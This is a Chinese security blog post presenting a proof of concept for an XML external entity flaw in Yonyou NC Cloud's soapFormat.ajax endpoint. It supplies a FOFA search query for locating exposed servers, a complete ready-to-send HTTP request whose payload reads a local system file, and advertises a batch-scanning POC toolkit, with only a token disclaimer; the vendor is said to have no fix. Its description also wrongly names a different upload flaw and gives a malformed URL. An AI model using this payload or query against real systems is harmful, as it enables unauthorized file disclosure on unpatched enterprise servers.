#  用友NC Cloud soapFormat.ajax接口存在XXE 附POC软件   
原创 南风徐来  南风漏洞复现文库   2023-12-26 23:00  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
**大家关注一下我的另外一个公众号，这个公众号也会发POC，两个公众号发的漏洞不一样，基本每天更新。新建一个小号主要是有两个目的：一是分摊风险，网络安全方面的公众号不知道什么时候就被封了，这个号已经有点危险了 ；二、漏洞实在太多了，一个号根本发不完。**  
  
  
****## 1. 用友NC Cloud 接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。  
## 2.漏洞描述  
  
用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC Cloud uploadChunk接口存在任意文件上传漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友NC Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y0iarsCwThWvaYJy2KghJiaQxAOh6QUohpgYfxvsta2NdRhwutWO65T7Ou8vgFLEmk0jV1dEtwvticg/640?wx_fmt=jpeg&from=appmsg "null")  
  
用友NC Cloud soapFormat.ajax接口存在XXE  
## 4.fofa查询语句  
  
body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"  
## 5.漏洞复现  
  
漏洞链接：http://1270.0.1/uapws/soapFormat.ajax  
  
漏洞数据包：  
```
POST /uapws/soapFormat.ajax HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 259

msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y0iarsCwThWvaYJy2KghJiaQQLxEsKrOh3ZVbias1WibbbKvR8tNiaEH9zN0FdHIqp1d4pOASvJMysnDg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现94 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y0iarsCwThWvaYJy2KghJiaQlaOicmPfvdTMjql2LU4QCtxf49Ffpac2MpwKgBJ2yU2umKicWpYUUBPA/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y0iarsCwThWvaYJy2KghJiaQSrqYTGkIicUPleR6OmAnYWEnc50NKrBZLGoZUJj5et9EWe0O7PEY2GQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y0iarsCwThWvaYJy2KghJiaQ4n9U0YoWiaGMmObzP6zozLU0YjbCQWByibYpwJn6yw4sTMVKlE5wDYQg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y0iarsCwThWvaYJy2KghJiaQx2xQfMAp9ypNbuvwA98HnwWmiacmoSnMgzOHcvu1fL1oqUibWDZICyAA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y0iarsCwThWvaYJy2KghJiaQCW9ibWIq6YkGHhJlOW7Owo44tQIvtHS66QicEMJjLIuh68blQfFppp6g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Y0iarsCwThWvaYJy2KghJiaQicia8BicedvMMAs8znM5ApCkZiaMv2yMtvPql3sZlbIKwQ0N51zmfVQFPA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修复方案，请关注厂商主页更新： https://www.yonyou.com/  
## 8.往期回顾  
  
[通达OA general/appbuilder/web/portal/gateway/moare接口存在反序列化 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484928&idx=1&sn=0c2a6c3a973aca771e954e881a4e727c&chksm=974b8b07a03c021139cf194ef83743d9ffc17df65940199d8315677f19e1258b6d9a5cbc9d6c&scene=21#wechat_redirect)  
  
  
[通达OA general/score/flow/scoredate/result.php接口存在SQL注入漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484926&idx=1&sn=f6cae15792075d5d6e77e65d814c4d3c&chksm=974b88f9a03c01ef1967bb70227e6d546a58fecff24d30455fdde07ffde293a255d3555156ea&scene=21#wechat_redirect)  
  
  
  
  
